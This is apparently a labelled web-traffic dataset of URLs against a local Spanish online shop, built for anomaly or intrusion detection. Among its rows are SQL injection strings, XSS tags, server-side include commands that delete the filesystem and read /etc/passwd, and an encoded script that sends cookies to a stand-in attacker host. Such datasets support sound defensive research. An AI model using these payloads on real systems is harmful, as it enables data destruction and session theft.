URL,Target
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=monaco&password=rOZnar&nombre=Kiara&apellidos=Palenzuela+Usa&email=badland.paudler%40dise%F1odesoftware.do&dni=86214709Z&direccion=C%2F+Alegria%2C+141%2C+12-H&ciudad=Villanueva+de+Oscos%22+AND+%221%22%3D%221&cp=24735&provincia=Ciudad+Real&ntc=4654942357042652&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Confirmar,1
http://localhost:8080/tienda1/global.java,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=92&B1A=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif/4861362529278789730.INC,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif.old,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/estore/annotated-index.html,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mcduffie&password=manganEar&nombre=Wayca&apellidos=Dabbas+Hurtado&email=brooking-doolittle%40encuentrodominios.lv&dni=76518142V&direccion=Sierra+Bermeja+S%2FN%2C+&ciudad=Ajamil&cp=15873&provincia=Almer%EDa&ntc=0567191601469528&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+AND+%271%27%3D%271,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=37&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=9317&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidadA=47&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp/6909030637832563290.jsp.java,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27OR%27a%3D%27a,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/techniques/servlets/index.html,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=40&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp.OLD,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jank%2Fowsk&pwd=franqueable&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=forca&remember=on&B1A=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=8305&B1=Confirmar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3733&B1=Confirmar,0
http://localhost:8080/catalog.nsf,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=86&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=fadhel&password=canaler3&nombre=Damasio&apellidos=Guito+Mat%F3&email=stribling.bettin%40bru%F1oseguridad.ye&dni=58753714F&direccion=Et%2Borbidea+*Galizia%2C+120+&ciudad=Tubilla+del+Agua&cp=16340&provincia=Toledo&ntc=4927358900726396&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=legrandv&password=vellora&nombre=Ursulina&apellidos=Cabieces+Amayuela&email=comerate.foldi%40ofertaschinas.dm&dni=48435837E&direccion=Calle+Fray+Luis+De+Leon+141%2C+7%3FC&ciudad=Andoain&cp=46815&provincia=Zamora&ntc=2070765320009143&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=li*bor7&password=al9u12z3&nombre=Basiana&apellidos=Fiesco+Terrazas&email=wakefield.yniguez%40aebo.so&dni=43471294Y&direccion=C%2F+Santa+Florentina+9%2C+11%3FH&ciudad=Asparrena&cp=16841&provincia=Lleida&ntc=6355628611222298&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=roig&pwd=verecunda&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/vti_txt/,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/6909030637832563290.jsp,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=aiden&pwd=aceit%F3n&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=subitha&password=alg59za&nombre=Benita&apellidos=Bus%F3+Ugartechea&email=winstanley%40waterflyesp.hn&dni=46760006V&direccion=Calle+Andorra%2C+191%2C+8-G&ciudad=Valencia+del+Mombuey&cp=43895&provincia=La+Rioja&ntc=4907598174142069&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080.bak,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4830&B1=Confirmar,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif.inc,1
http://localhost:8080/samples/isapi/isapi.htm,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=41&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&cantidad=67&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%2B,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/IISSamples/sdk/asp/docs/toolbar.asp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tropeano3&password=86a7o&nombre=Alimena&apellidos=Santidrian+Rexach&email=musson%40ajuntamentdebarcelona20.pr&dni=12186635Q&direccion=Castilla+S%2FN+&ciudad=Legarda&cp=33875&provincia=Toledo&ntc=5536600969659944&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maiga&password=eXtremosa&nombre=Biridiana&apellidos=Olid+Seuba&email=ruick_heasley4%4018horas.ro&dni=83288994Z&direccion=Praza+General+Mola%2C+5+8%3FG&ciudad=Llosa%2C+la&cp=12414&provincia=Burgos&ntc=0852672704954562&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980%27INJECTED_PARAM&B1=Confirmar,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=77&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5083&B1=Confirmar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=massimil&password=2olt&nombre=Marcos&apellidos=Fancelli+Joral&email=regis%40magritte.us&dni=52207398C&direccion=Urbanitzacio+Las+Lomas%2C+18%2C+4A&ciudad=Casillas&cp=16435&provincia=Zaragoza&ntc=9173064367648056&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&login=world.fa&pwd=entremeter&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=350&B1=Confirmar%2F,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7012&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.Bak,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=72&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gaye&password=kanTiaNa&nombre=Fructuoso&apellidos=Rodrigo+Ambr%F3s&email=bloom%40ajuntamentbcn2-0.sz&dni=96068417Q&direccion=C%2F+Juan+Sebastian+Elcano+178+&ciudad=%3FV%2Fa%3Fldeverdeja&cp=17741&provincia=Lleida&ntc=5250839743016206&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=89&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/4861362529278789730~,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.BAK,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zeigler&pwd=7ERVAnT0F2La&remember=on%2F&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/ws-client/loanCalculation.jsp,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/global/titulo.jsp.old,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=5&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gallard&password=c36ba&nombre=Federica&apellidos=Romaguera+Po%2Cc*h&email=pankin%40muevetuweb.mobi&dni=49680817N&direccion=Calle+Zapateria+Vieja+71+8D&ciudad=Romanillos+de+Atienza&cp=03579&provincia=Tarragona&ntc=2469234767327968&B1=Registrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oke&pwd=deSoLLADamen-te&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heki&pwd=RasqUEtEAR&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vehling&password=cargadas&nombre=Rodipo&apellidos=Peteiro&email=szmidt%40surcosur.id&dni=64709043S&direccion=Calle+Ourense+119+5%3FF&ciudad=Puerto+Real&cp=2632A&provincia=Guadalajara&ntc=0132612345545070&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dafoe&password=25I6La&nombre=Aldebar&apellidos=Homs+Breither&email=darrieu%40redstarz.sv&dni=15984899Z&direccion=Calle+Miguel+Hernandez%2C+195%2C+&ciudad=Borrenes&cp=05292&provincia=Badajoz&ntc=2018706019934845&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2018&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=88&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/?OpenServer,1
http://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp,1
http://localhost:8080/tienda1/miembros/index.jsp/4861362529278789730,1
http://localhost:8080/samples/sampsite/catalog.htm,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7661&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=racette&password=j804n86O&nombre=Gino&apellidos=Puy&email=borgeaud%40enmenorca.com.om&dni=52984297W&direccion=Jabeque%2C+86%2C+&ciudad=Relleu&cp=45810&provincia=%C1vila&ntc=9280522239849881&B1=Registrar,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=akhtar6&pwd=%2Fc2nsi004r%27io&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=81&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8506&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lilah&password=i5sepulta&nombre=Hemilce&apellidos=Longoria+Aro&email=jahnen%40hojadecalculo.com.mm&dni=04212893Y&direccion=Palanca+106%2C+&ciudad=Bail%E9n&cp=20100&provincia=Cuenca&ntc=5713340032825247&B1=Registrar,0
http://localhost:8080.Bak,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg.BAK,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/.old,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3471&B1=%22+AND+%221%22%3D%221,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=8&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brenda&password=8ienne2s6&nombre=Gil&apellidos=Cote+Suengas&email=alpar-ornstein%40rockefeller.nu&dni=15423399J&direccion=Calle+Duque+De+Ahumada%2C+67%2C+&ciudad=Horcajo+de+Montemayor&cp=46844&provincia=Zamora&ntc=8961981301450385&B1=Registrar,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/_cti_pvt/linkinfo.cnf,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=doroteya&pwd=357rte0o&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=%27+DELETE+FROM+USERS&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/miembros.jsp/4861362529278789730.java,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lauriaul&password=er3t3e1&nombre=Fabrizzio&apellidos=Atanas%F3pulos&email=nype.shafer%40canovash.bv&dni=38355013Y&direccion=Pla%E7a+Catalunya+124%2C+5-B&ciudad=Merindad+de+R%EDo+Ubierna&cp=19312&provincia=Palencia&ntc=1437589782727245&B1=Registrar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=%27OR%27a%3D%27a&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=27&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vera&password=0ip0rbol1id7&nombre=N%3Fel%2Bma&apellidos=Artells+Arteta&email=henn_others%40lasmilyuna.gi&dni=13605020Z&direccion=Paseo+Alcalde+Rafael+Ginel%2C+121+&ciudad=Fuentelisendo&cp=09219&provincia=Madrid&ntc=6311255681512253&B1=Registrar,1
